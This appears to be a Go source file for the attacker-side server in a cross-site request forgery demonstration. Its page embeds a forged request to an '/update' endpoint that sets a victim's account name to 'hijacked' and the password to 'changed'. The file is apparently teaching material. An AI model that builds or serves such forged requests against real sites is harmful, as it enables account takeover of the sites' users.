package main

import (
	"encoding/base64"
	"fmt"
	"html/template"
	"log"
	"math/rand"
	"net/http"
	"time"
)

func init() {
	rand.Seed(time.Now().UTC().UnixNano())
}

func handle(w http.ResponseWriter, r *http.Request) {
	if r.RequestURI == "/favicon.ico" {
		handleFavicon(w)
		return
	}

	var err error

	t := template.New("homepage")
	t, err = t.Parse(homepageTmpl)

	if err != nil {
		log.Printf("error parsing homepage template. details: %s", err)
		w.WriteHeader(http.StatusInternalServerError)
		return
	}

	data := data{
		AttackURL: fmt.Sprintf("http://%s/update?name=hijacked&password=changed", attackServer),
	}

	if err = t.Execute(w, data); err != nil {
		log.Printf("error executing homepage template. details: %s", err)
		w.WriteHeader(http.StatusInternalServerError)
		return
	}
}

func handleFavicon(w http.ResponseWriter) {
	favicon, err := base64.StdEncoding.DecodeString(faviconData)

	if err != nil {
		log.Printf("error decoding favicon. details: %s", err)
		w.WriteHeader(http.StatusInternalServerError)
		return
	}

	w.Header().Add("Content-Type", "image/jpeg")
	if _, err = w.Write(favicon); err != nil {
		log.Printf("error writing body. details: %s", err)
		w.WriteHeader(http.StatusInternalServerError)
	}
}
